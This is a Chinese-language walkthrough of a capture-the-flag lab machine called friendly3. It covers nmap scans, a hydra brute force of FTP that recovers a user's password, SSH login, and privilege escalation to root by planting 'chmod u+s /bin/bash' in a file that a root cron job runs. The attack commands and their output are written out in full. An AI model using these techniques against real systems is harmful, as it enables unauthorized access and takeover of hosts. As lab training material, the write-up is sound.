# 信息搜集

主机发现

```
┌──(kali㉿kali)-[~]
└─$ nmap -sn 192.168.2.0/24 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-19 05:28 EDT
Nmap scan report for friendly3 (192.168.2.12)
Host is up (0.00027s latency).
MAC Address: 08:00:27:D8:C4:51 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for kali (192.168.2.10)
Host is up.
Nmap done: 256 IP addresses (8 hosts up) scanned in 2.62 seconds
```

端口扫描

```
┌──(kali㉿kali)-[~]
└─$ nmap -A -p- 192.168.2.12
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-19 05:30 EDT
Nmap scan report for friendly3 (192.168.2.12)
Host is up (0.00026s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2 (protocol 2.0)
| ssh-hostkey: 
|   256 bc:46:3d:85:18:bf:c7:bb:14:26:9a:20:6c:d3:39:52 (ECDSA)
|_  256 7b:13:5a:46:a5:62:33:09:24:9d:3e:67:b6:eb:3f:a1 (ED25519)
80/tcp open  http    nginx 1.22.1
|_http-server-header: nginx/1.22.1
|_http-title: Welcome to nginx!
MAC Address: 08:00:27:D8:C4:51 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.26 ms friendly3 (192.168.2.12)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.83 seconds
```

# 漏洞利用

ftp匿名登录失败了

```
┌──(kali㉿kali)-[~]
└─$ ftp 192.168.2.12 
Connected to 192.168.2.12.
220 (vsFTPd 3.0.3)
Name (192.168.2.12:kali): anonymous
331 Please specify the password.
Password: 
530 Login incorrect.
```

看一下80端口

```
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.2.12
<!DOCTYPE html>
<html>
<head>
<title>Welcome to nginx!</title>
<style>
html { color-scheme: light dark; }
body { width: 40em; margin: 0 auto;
font-family: Tahoma, Verdana, Arial, sans-serif; }
</style>
</head>
<body>
<p>Hi, sysadmin<br>I want you to know that I've just uploaded the new files into the FTP Server.<br>See you,<br>juan.</p>
</body>sysadmin
</html>
```

目录扫描没扫出什么，看提示，应该还是ftp

```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -w SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -u http://192.168.2.12 -x html,php,txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.2.12
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 355]
Progress: 4741016 / 4741020 (100.00%)
===============================================================
Finished
===============================================================
```

把juan和sysadmin保存下来，爆破一下

```
┌──(kali㉿kali)-[~]
└─$ hydra -L 1.txt -P /usr/share/wordlists/rockyou.txt ftp://192.168.2.12                                     
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-19 06:58:05
[DATA] max 16 tasks per 1 server, overall 16 tasks, 28688798 login tries (l:2/p:14344399), ~1793050 tries per task
[DATA] attacking ftp://192.168.2.12:21/
[21][ftp] host: 192.168.2.12   login: juan   password: alexis
```

看一下ftp有什么，很多，但是没有找到有用的东西

```
┌──(kali㉿kali)-[~]
└─$ ftp juan@192.168.2.12
Connected to 192.168.2.12.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||47345|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0               0 Jun 25  2023 file1
-rw-r--r--    1 0        0               0 Jun 25  2023 file10
-rw-r--r--    1 0        0               0 Jun 25  2023 file100
-rw-r--r--    1 0        0               0 Jun 25  2023 file11
-rw-r--r--    1 0        0               0 Jun 25  2023 file12
-rw-r--r--    1 0        0               0 Jun 25  2023 file13
-rw-r--r--    1 0        0               0 Jun 25  2023 file14
-rw-r--r--    1 0        0               0 Jun 25  2023 file15
-rw-r--r--    1 0        0               0 Jun 25  2023 file16
-rw-r--r--    1 0        0               0 Jun 25  2023 file17
-rw-r--r--    1 0        0               0 Jun 25  2023 file18
-rw-r--r--    1 0        0               0 Jun 25  2023 file19
-rw-r--r--    1 0        0               0 Jun 25  2023 file2
-rw-r--r--    1 0        0               0 Jun 25  2023 file20
-rw-r--r--    1 0        0               0 Jun 25  2023 file21
-rw-r--r--    1 0        0               0 Jun 25  2023 file22
-rw-r--r--    1 0        0               0 Jun 25  2023 file23
-rw-r--r--    1 0        0               0 Jun 25  2023 file24
-rw-r--r--    1 0        0               0 Jun 25  2023 file25
-rw-r--r--    1 0        0               0 Jun 25  2023 file26
-rw-r--r--    1 0        0               0 Jun 25  2023 file27
-rw-r--r--    1 0        0               0 Jun 25  2023 file28
-rw-r--r--    1 0        0               0 Jun 25  2023 file29
-rw-r--r--    1 0        0               0 Jun 25  2023 file3
-rw-r--r--    1 0        0               0 Jun 25  2023 file30
-rw-r--r--    1 0        0               0 Jun 25  2023 file31
-rw-r--r--    1 0        0               0 Jun 25  2023 file32
-rw-r--r--    1 0        0               0 Jun 25  2023 file33
-rw-r--r--    1 0        0               0 Jun 25  2023 file34
-rw-r--r--    1 0        0               0 Jun 25  2023 file35
-rw-r--r--    1 0        0               0 Jun 25  2023 file36
-rw-r--r--    1 0        0               0 Jun 25  2023 file37
-rw-r--r--    1 0        0               0 Jun 25  2023 file38
-rw-r--r--    1 0        0               0 Jun 25  2023 file39
-rw-r--r--    1 0        0               0 Jun 25  2023 file4
-rw-r--r--    1 0        0               0 Jun 25  2023 file40
-rw-r--r--    1 0        0               0 Jun 25  2023 file41
-rw-r--r--    1 0        0               0 Jun 25  2023 file42
-rw-r--r--    1 0        0               0 Jun 25  2023 file43
-rw-r--r--    1 0        0               0 Jun 25  2023 file44
-rw-r--r--    1 0        0               0 Jun 25  2023 file45
-rw-r--r--    1 0        0               0 Jun 25  2023 file46
-rw-r--r--    1 0        0               0 Jun 25  2023 file47
-rw-r--r--    1 0        0               0 Jun 25  2023 file48
-rw-r--r--    1 0        0               0 Jun 25  2023 file49
-rw-r--r--    1 0        0               0 Jun 25  2023 file5
-rw-r--r--    1 0        0               0 Jun 25  2023 file50
-rw-r--r--    1 0        0               0 Jun 25  2023 file51
-rw-r--r--    1 0        0               0 Jun 25  2023 file52
-rw-r--r--    1 0        0               0 Jun 25  2023 file53
-rw-r--r--    1 0        0               0 Jun 25  2023 file54
-rw-r--r--    1 0        0               0 Jun 25  2023 file55
-rw-r--r--    1 0        0               0 Jun 25  2023 file56
-rw-r--r--    1 0        0               0 Jun 25  2023 file57
-rw-r--r--    1 0        0               0 Jun 25  2023 file58
-rw-r--r--    1 0        0               0 Jun 25  2023 file59
-rw-r--r--    1 0        0               0 Jun 25  2023 file6
-rw-r--r--    1 0        0               0 Jun 25  2023 file60
-rw-r--r--    1 0        0               0 Jun 25  2023 file61
-rw-r--r--    1 0        0               0 Jun 25  2023 file62
-rw-r--r--    1 0        0               0 Jun 25  2023 file63
-rw-r--r--    1 0        0               0 Jun 25  2023 file64
-rw-r--r--    1 0        0               0 Jun 25  2023 file65
-rw-r--r--    1 0        0               0 Jun 25  2023 file66
-rw-r--r--    1 0        0               0 Jun 25  2023 file67
-rw-r--r--    1 0        0               0 Jun 25  2023 file68
-rw-r--r--    1 0        0               0 Jun 25  2023 file69
-rw-r--r--    1 0        0               0 Jun 25  2023 file7
-rw-r--r--    1 0        0               0 Jun 25  2023 file70
-rw-r--r--    1 0        0               0 Jun 25  2023 file71
-rw-r--r--    1 0        0               0 Jun 25  2023 file72
-rw-r--r--    1 0        0               0 Jun 25  2023 file73
-rw-r--r--    1 0        0               0 Jun 25  2023 file74
-rw-r--r--    1 0        0               0 Jun 25  2023 file75
-rw-r--r--    1 0        0               0 Jun 25  2023 file76
-rw-r--r--    1 0        0               0 Jun 25  2023 file77
-rw-r--r--    1 0        0               0 Jun 25  2023 file78
-rw-r--r--    1 0        0               0 Jun 25  2023 file79
-rw-r--r--    1 0        0               0 Jun 25  2023 file8
-rw-r--r--    1 0        0              36 Jun 25  2023 file80
-rw-r--r--    1 0        0               0 Jun 25  2023 file81
-rw-r--r--    1 0        0               0 Jun 25  2023 file82
-rw-r--r--    1 0        0               0 Jun 25  2023 file83
-rw-r--r--    1 0        0               0 Jun 25  2023 file84
-rw-r--r--    1 0        0               0 Jun 25  2023 file85
-rw-r--r--    1 0        0               0 Jun 25  2023 file86
-rw-r--r--    1 0        0               0 Jun 25  2023 file87
-rw-r--r--    1 0        0               0 Jun 25  2023 file88
-rw-r--r--    1 0        0               0 Jun 25  2023 file89
-rw-r--r--    1 0        0               0 Jun 25  2023 file9
-rw-r--r--    1 0        0               0 Jun 25  2023 file90
-rw-r--r--    1 0        0               0 Jun 25  2023 file91
-rw-r--r--    1 0        0               0 Jun 25  2023 file92
-rw-r--r--    1 0        0               0 Jun 25  2023 file93
-rw-r--r--    1 0        0               0 Jun 25  2023 file94
-rw-r--r--    1 0        0               0 Jun 25  2023 file95
-rw-r--r--    1 0        0               0 Jun 25  2023 file96
-rw-r--r--    1 0        0               0 Jun 25  2023 file97
-rw-r--r--    1 0        0               0 Jun 25  2023 file98
-rw-r--r--    1 0        0               0 Jun 25  2023 file99
drwxr-xr-x    2 0        0            4096 Jun 25  2023 fold10
drwxr-xr-x    2 0        0            4096 Jun 25  2023 fold11
drwxr-xr-x    2 0        0            4096 Jun 25  2023 fold12
drwxr-xr-x    2 0        0            4096 Jun 25  2023 fold13
drwxr-xr-x    2 0        0            4096 Jun 25  2023 fold14
drwxr-xr-x    2 0        0            4096 Jun 25  2023 fold15
drwxr-xr-x    2 0        0            4096 Jun 25  2023 fold4
drwxr-xr-x    2 0        0            4096 Jun 25  2023 fold5
drwxr-xr-x    2 0        0            4096 Jun 25  2023 fold6
drwxr-xr-x    2 0        0            4096 Jun 25  2023 fold7
drwxr-xr-x    2 0        0            4096 Jun 25  2023 fold8
drwxr-xr-x    2 0        0            4096 Jun 25  2023 fold9
-rw-r--r--    1 0        0              58 Jun 25  2023 fole32
226 Directory send OK.
ftp>
```

发现也连接ssh

```
┌──(kali㉿kali)-[~]
└─$ ssh juan@192.168.2.12               
The authenticity of host '192.168.2.12 (192.168.2.12)' can't be established.
ED25519 key fingerprint is SHA256:qcoxC68+orQ8LIJrunR2ElUTnj9X5X0OFj9F/oxHDjc.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.2.12' (ED25519) to the list of known hosts.
juan@192.168.2.12's password: 
Linux friendly3 6.1.0-9-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.27-1 (2023-05-08) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
juan@friendly3:~$
```

# 权限提升

发现一个定时任务

<img width="565" height="136" alt="图片" src="https://github.com/user-attachments/assets/02dca4a7-0d9d-4243-883c-d86f94736234" />

创建一个a.bash

```
juan@friendly3:/opt$ cat check_for_install.sh 
#!/bin/bash


/usr/bin/curl "http://127.0.0.1/9842734723948024.bash" > /tmp/a.bash

chmod +x /tmp/a.bash
chmod +r /tmp/a.bash
chmod +w /tmp/a.bash

/bin/bash /tmp/a.bash

rm -rf /tmp/a.bash
juan@friendly3:/tmp$ echo "chmod u+s /bin/bash" > a.bash
juan@friendly3:/tmp$ cat a.bash 
chmod u+s /bin/bash
juan@friendly3:/tmp$ bash -p
bash-5.2# id
uid=1001(juan) gid=1001(juan) euid=0(root) egid=0(root) groups=0(root),1001(juan)
```
